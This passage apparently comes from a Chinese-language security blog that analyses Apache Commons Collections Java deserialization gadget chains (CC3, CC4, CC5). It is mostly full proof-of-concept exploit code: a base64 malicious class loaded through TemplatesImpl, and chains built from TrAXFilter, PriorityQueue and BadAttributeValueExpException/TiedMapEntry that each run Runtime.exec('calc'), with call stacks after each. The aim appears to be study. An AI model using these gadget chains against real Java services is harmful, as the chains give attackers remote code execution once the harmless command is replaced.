class="string">&quot;yv66vgAAADQAOQoAAwAiBwA3BwAlBwAmAQAQc2VyaWFsVmVyc2lvblVJRAEAAUoBAA1Db25zdGFudFZhbHVlBa0gk/OR3e8+AQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBABNTdHViVHJhbnNsZXRQYXlsb2FkAQAMSW5uZXJDbGFzc2VzAQAxTGNvbS9leGFtcGxlL1Rlc3RUcmFuc2Zvcm1lciRTdHViVHJhbnNsZXRQYXlsb2FkOwEACXRyYW5zZm9ybQEAcihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEACGRvY3VtZW50AQAtTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007AQAIaGFuZGxlcnMBAEJbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjsBAApFeGNlcHRpb25zBwAnAQCmKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEACGl0ZXJhdG9yAQA1TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjsBAAdoYW5kbGVyAQBBTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjsBAApTb3VyY2VGaWxlAQAUVGVzdFRyYW5zZm9ybWVyLmphdmEMAAoACwcAKAEAL2NvbS9leGFtcGxlL1Rlc3RUcmFuc2Zvcm1lciRTdHViVHJhbnNsZXRQYXlsb2FkAQBAY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL3J1bnRpbWUvQWJzdHJhY3RUcmFuc2xldAEAFGphdmEvaW8vU2VyaWFsaXphYmxlAQA5Y29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL1RyYW5zbGV0RXhjZXB0aW9uAQAbY29tL2V4YW1wbGUvVGVzdFRyYW5zZm9ybWVyAQAIPGNsaW5pdD4BABFqYXZhL2xhbmcvUnVudGltZQcAKgEACmdldFJ1bnRpbWUBABUoKUxqYXZhL2xhbmcvUnVudGltZTsMACwALQoAKwAuAQAEY2FsYwgAMAEABGV4ZWMBACcoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvUHJvY2VzczsMADIAMwoAKwA0AQANU3RhY2tNYXBUYWJsZQEAHnlzb3NlcmlhbC9Qd25lcjU0MDQzOTYxNzA2NjcwMAEAIEx5c29zZXJpYWwvUHduZXI1NDA0Mzk2MTcwNjY3MDA7ACEAAgADAAEABAABABoABQAGAAEABwAAAAIACAAEAAEACgALAAEADAAAAC8AAQABAAAABSq3AAGxAAAAAgANAAAABgABAAAAHAAOAAAADAABAAAABQAPADgAAAABABMAFAACAAwAAAA/AAAAAwAAAAGxAAAAAgANAAAABgABAAAAIgAOAAAAIAADAAAAAQAPADgAAAAAAAEAFQAWAAEAAAABABcAGAACABkAAAAEAAEAGgABABMAGwACAAwAAABJAAAABAAAAAGxAAAAAgANAAAABgABAAAAJwAOAAAAKgAEAAAAAQAPADgAAAAAAAEAFQAWAAEAAAABABwAHQACAAAAAQAeAB8AAwAZAAAABAABABoACAApAAsAAQAMAAAAJAADAAIAAAAPpwADAUy4AC8SMbYANVexAAAAAQA2AAAAAwABAwACACAAAAACACEAEQAAAAoAAQACACMAEAAJ&quot;</span>);</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">obj</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        setFieldValue(obj, <span class="string">&quot;_bytecodes&quot;</span>, <span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;code&#125;);</span><br><span class="line">        setFieldValue(obj, <span class="string">&quot;_name&quot;</span>, <span class="string">&quot;HelloTemplatesImpl&quot;</span>);</span><br><span class="line">        setFieldValue(obj, <span class="string">&quot;_tfactory&quot;</span>, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line"></span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(TrAXFilter.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InstantiateTransformer</span>(<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Templates.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;obj&#125;),</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">Transformer</span> <span class="variable">transformerChain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(<span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;<span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="number">1</span>)&#125;);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">innerMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        <span class="type">Map</span> <span class="variable">outerMap</span> <span class="operator">=</span> LazyMap.decorate(innerMap, transformerChain);</span><br><span class="line"></span><br><span class="line">        <span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">construct</span> <span class="operator">=</span> clazz.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">        construct.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">InvocationHandler</span> <span class="variable">handler</span> <span class="operator">=</span> (InvocationHandler) construct.newInstance(Retention.class, outerMap);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">proxyMap</span> <span class="operator">=</span> (Map) Proxy.newProxyInstance(Map.class.getClassLoader(), <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Map.class&#125;, handler);</span><br><span class="line"></span><br><span class="line">        handler = (InvocationHandler) construct.newInstance(Retention.class, proxyMap);</span><br><span class="line"></span><br><span class="line">        setFieldValue(transformerChain, <span class="string">&quot;iTransformers&quot;</span>, transformers);</span><br><span class="line"></span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">byteArrayOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">objectOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(byteArrayOutputStream);</span><br><span class="line">        objectOutputStream.writeObject(handler);</span><br><span class="line"></span><br><span class="line">        <span class="type">ByteArrayInputStream</span> <span class="variable">byteArrayInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(byteArrayOutputStream.toByteArray());</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">objectInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(byteArrayInputStream);</span><br><span class="line">        objectInputStream.readObject();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(Object object, String fieldName, Object value)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> object.getClass().getDeclaredField(fieldName);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(object, value);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>调用栈如下：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">defineClass:142, TemplatesImpl$TransletClassLoader (com.sun.org.apache.xalan.internal.xsltc.trax)</span><br><span class="line">defineTransletClasses:346, TemplatesImpl (com.sun.org.apache.xalan.internal.xsltc.trax)</span><br><span class="line">getTransletInstance:383, TemplatesImpl (com.sun.org.apache.xalan.internal.xsltc.trax)</span><br><span class="line">newTransformer:418, TemplatesImpl (com.sun.org.apache.xalan.internal.xsltc.trax)</span><br><span class="line">&lt;init&gt;:64, TrAXFilter (com.sun.org.apache.xalan.internal.xsltc.trax)</span><br><span class="line">...</span><br><span class="line">newInstance:408, Constructor (java.lang.reflect)</span><br><span class="line">transform:106, InstantiateTransformer (org.apache.commons.collections.functors)</span><br><span class="line">transform:123, ChainedTransformer (org.apache.commons.collections.functors)</span><br><span class="line">get:158, LazyMap (org.apache.commons.collections.map)</span><br><span class="line">invoke:69, AnnotationInvocationHandler (sun.reflect.annotation)</span><br><span class="line">entrySet:-1, $Proxy1 (com.sun.proxy)</span><br><span class="line">readObject:349, AnnotationInvocationHandler (sun.reflect.annotation)</span><br><span class="line">...</span><br><span class="line">main:53, CommonsCollections3 (com.example)</span><br></pre></td></tr></table></figure></div>
<h3 id="CommonsCollections4（CC2-TrAXFilter）"><a href="#CommonsCollections4（CC2-TrAXFilter）" class="headerlink" title="CommonsCollections4（CC2+TrAXFilter）"></a>CommonsCollections4（CC2+TrAXFilter）</h3><p>在 CC2 的基础上借助 <code>TrAXFilter</code>+<code>TemplatesImpl</code> 加载字节码绕过对 <code>InvokerTransformer</code> 的过滤，另外我把 <code>TrAXFilter.class</code> 存到 <code>PriorityQueue</code> 中可以避免 <code>Transformer</code> 数组。</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.comparators.TransformingComparator;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.InstantiateTransformer;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.Templates;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"><span class="keyword">import</span> java.util.Comparator;</span><br><span class="line"><span class="keyword">import</span> java.util.PriorityQueue;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CommonsCollections4</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">byte</span>[] code = Base64.getDecoder().decode(<span class="string">&quot;yv66vgAAADQAOQoAAwAiBwA3BwAlBwAmAQAQc2VyaWFsVmVyc2lvblVJRAEAAUoBAA1Db25zdGFudFZhbHVlBa0gk/OR3e8+AQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBABNTdHViVHJhbnNsZXRQYXlsb2FkAQAMSW5uZXJDbGFzc2VzAQAxTGNvbS9leGFtcGxlL1Rlc3RUcmFuc2Zvcm1lciRTdHViVHJhbnNsZXRQYXlsb2FkOwEACXRyYW5zZm9ybQEAcihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEACGRvY3VtZW50AQAtTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007AQAIaGFuZGxlcnMBAEJbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjsBAApFeGNlcHRpb25zBwAnAQCmKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEACGl0ZXJhdG9yAQA1TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjsBAAdoYW5kbGVyAQBBTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjsBAApTb3VyY2VGaWxlAQAUVGVzdFRyYW5zZm9ybWVyLmphdmEMAAoACwcAKAEAL2NvbS9leGFtcGxlL1Rlc3RUcmFuc2Zvcm1lciRTdHViVHJhbnNsZXRQYXlsb2FkAQBAY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL3J1bnRpbWUvQWJzdHJhY3RUcmFuc2xldAEAFGphdmEvaW8vU2VyaWFsaXphYmxlAQA5Y29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL1RyYW5zbGV0RXhjZXB0aW9uAQAbY29tL2V4YW1wbGUvVGVzdFRyYW5zZm9ybWVyAQAIPGNsaW5pdD4BABFqYXZhL2xhbmcvUnVudGltZQcAKgEACmdldFJ1bnRpbWUBABUoKUxqYXZhL2xhbmcvUnVudGltZTsMACwALQoAKwAuAQAEY2FsYwgAMAEABGV4ZWMBACcoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvUHJvY2VzczsMADIAMwoAKwA0AQANU3RhY2tNYXBUYWJsZQEAHnlzb3NlcmlhbC9Qd25lcjU0MDQzOTYxNzA2NjcwMAEAIEx5c29zZXJpYWwvUHduZXI1NDA0Mzk2MTcwNjY3MDA7ACEAAgADAAEABAABABoABQAGAAEABwAAAAIACAAEAAEACgALAAEADAAAAC8AAQABAAAABSq3AAGxAAAAAgANAAAABgABAAAAHAAOAAAADAABAAAABQAPADgAAAABABMAFAACAAwAAAA/AAAAAwAAAAGxAAAAAgANAAAABgABAAAAIgAOAAAAIAADAAAAAQAPADgAAAAAAAEAFQAWAAEAAAABABcAGAACABkAAAAEAAEAGgABABMAGwACAAwAAABJAAAABAAAAAGxAAAAAgANAAAABgABAAAAJwAOAAAAKgAEAAAAAQAPADgAAAAAAAEAFQAWAAEAAAABABwAHQACAAAAAQAeAB8AAwAZAAAABAABABoACAApAAsAAQAMAAAAJAADAAIAAAAPpwADAUy4AC8SMbYANVexAAAAAQA2AAAAAwABAwACACAAAAACACEAEQAAAAoAAQACACMAEAAJ&quot;</span>);</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">obj</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        setFieldValue(obj, <span class="string">&quot;_bytecodes&quot;</span>, <span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;code&#125;);</span><br><span class="line">        setFieldValue(obj, <span class="string">&quot;_name&quot;</span>, <span class="string">&quot;HelloTemplatesImpl&quot;</span>);</span><br><span class="line">        setFieldValue(obj, <span class="string">&quot;_tfactory&quot;</span>, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line"></span><br><span class="line">        <span class="type">Transformer</span> <span class="variable">transformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InstantiateTransformer</span>(<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Templates.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;obj&#125;);</span><br><span class="line">        <span class="type">Comparator</span> <span class="variable">comparator</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TransformingComparator</span>(transformer);</span><br><span class="line">        <span class="type">PriorityQueue</span> <span class="variable">queue</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>(<span class="number">2</span>, comparator);</span><br><span class="line">        setFieldValue(queue, <span class="string">&quot;queue&quot;</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;TrAXFilter.class, TrAXFilter.class&#125;);</span><br><span class="line">        setFieldValue(queue, <span class="string">&quot;size&quot;</span>, <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">byteArrayOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">objectOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(byteArrayOutputStream);</span><br><span class="line">        objectOutputStream.writeObject(queue);</span><br><span class="line"></span><br><span class="line">        <span class="type">ByteArrayInputStream</span> <span class="variable">byteArrayInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(byteArrayOutputStream.toByteArray());</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">objectInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(byteArrayInputStream);</span><br><span class="line">        objectInputStream.readObject();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(Object object, String fieldName, Object value)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> object.getClass().getDeclaredField(fieldName);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(object, value);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>调用栈如下：</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line">defineClass:<span class="number">142</span>, TemplatesImpl$TransletClassLoader (com.sun.org.apache.xalan.internal.xsltc.trax)</span><br><span class="line">defineTransletClasses:<span class="number">346</span>, TemplatesImpl (com.sun.org.apache.xalan.internal.xsltc.trax)</span><br><span class="line">getTransletInstance:<span class="number">383</span>, TemplatesImpl (com.sun.org.apache.xalan.internal.xsltc.trax)</span><br><span class="line">newTransformer:<span class="number">418</span>, TemplatesImpl (com.sun.org.apache.xalan.internal.xsltc.trax)</span><br><span class="line">&lt;init&gt;:<span class="number">64</span>, TrAXFilter (com.sun.org.apache.xalan.internal.xsltc.trax)</span><br><span class="line">...</span><br><span class="line">transform:<span class="number">32</span>, InstantiateTransformer (org.apache.commons.collections4.functors)</span><br><span class="line">compare:<span class="number">81</span>, TransformingComparator (org.apache.commons.collections4.comparators)</span><br><span class="line">siftDownUsingComparator:<span class="number">721</span>, PriorityQueue (java.util)</span><br><span class="line">siftDown:<span class="number">687</span>, PriorityQueue (java.util)</span><br><span class="line">heapify:<span class="number">736</span>, PriorityQueue (java.util)</span><br><span class="line">readObject:<span class="number">795</span>, PriorityQueue (java.util)</span><br><span class="line">...</span><br><span class="line">main:<span class="number">40</span>, CommonsCollections4 (com.example)</span><br></pre></td></tr></table></figure></div>
<h3 id="CommonsCollections5（BadAttributeValueExpException→TiedMapEntry）"><a href="#CommonsCollections5（BadAttributeValueExpException→TiedMapEntry）" class="headerlink" title="CommonsCollections5（BadAttributeValueExpException→TiedMapEntry）"></a>CommonsCollections5（BadAttributeValueExpException→TiedMapEntry）</h3><p><code>javax.management.BadAttributeValueExpException</code> 在反序列化 <code>readObject</code> 时如果满足 <code>System.getSecurityManager() == null</code> 条件时会对其中的 <code>val</code> 成员调用 <code>toString</code> 方法。</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">(ObjectInputStream ois)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">    ObjectInputStream.<span class="type">GetField</span> <span class="variable">gf</span> <span class="operator">=</span> ois.readFields();</span><br><span class="line">    <span class="type">Object</span> <span class="variable">valObj</span> <span class="operator">=</span> gf.get(<span class="string">&quot;val&quot;</span>, <span class="literal">null</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (valObj == <span class="literal">null</span>) &#123;</span><br><span class="line">        val = <span class="literal">null</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (valObj <span class="keyword">instanceof</span> String) &#123;</span><br><span class="line">        val= valObj;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (System.getSecurityManager() == <span class="literal">null</span></span><br><span class="line">            || valObj <span class="keyword">instanceof</span> Long</span><br><span class="line">            || valObj <span class="keyword">instanceof</span> Integer</span><br><span class="line">            || valObj <span class="keyword">instanceof</span> Float</span><br><span class="line">            || valObj <span class="keyword">instanceof</span> Double</span><br><span class="line">            || valObj <span class="keyword">instanceof</span> Byte</span><br><span class="line">            || valObj <span class="keyword">instanceof</span> Short</span><br><span class="line">            || valObj <span class="keyword">instanceof</span> Boolean) &#123;</span><br><span class="line">        val = valObj.toString();</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123; <span class="comment">// the serialized object is from a version without JDK-8019292 fix</span></span><br><span class="line">        val = System.identityHashCode(valObj) + <span class="string">&quot;@&quot;</span> + valObj.getClass().getName();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>而 <code>TiedMapEntry</code> 的 <code>toString</code> 方法最终会调用到 <code>map.get</code> 方法，正好可以与 <code>LazyMap</code> 的利用链结合。</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">getValue</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> map.get(key);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> String <span class="title function_">toString</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> getKey() + <span class="string">&quot;=&quot;</span> + getValue();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>POC 如下：</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.management.BadAttributeValueExpException;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CommonsCollections5</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;),</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">Transformer</span> <span class="variable">transformerChain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">innerMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        <span class="type">Map</span> <span class="variable">outerMap</span> <span class="operator">=</span> LazyMap.decorate(innerMap, transformerChain);</span><br><span class="line">        <span class="type">TiedMapEntry</span> <span class="variable">entry</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(outerMap, <span class="string">&quot;sky&quot;</span>);</span><br><span class="line">        outerMap.clear();</span><br><span class="line">        <span class="type">BadAttributeValueExpException</span> <span class="variable">exception</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BadAttributeValueExpException</span>(<span class="literal">null</span>);</span><br><span class="line">        setFieldValue(exception, <span class="string">&quot;val&quot;</span>, entry);</span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">byteArrayOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">objectOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(byteArrayOutputStream);</span><br><span class="line">        objectOutputStream.writeObject(exception);</span><br><span class="line"></span><br><span class="line">        <span class="type">ByteArrayInputStream</span> <span class="variable">byteArrayInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(byteArrayOutputStream.toByteArray());</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">objectInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(byteArrayInputStream);</span><br><span class="line">        objectInputStream.readObject();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(Object object, String fieldName, Object value)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> object.getClass().getDeclaredField(fieldName);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(object, value);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>调用栈如下：</p>
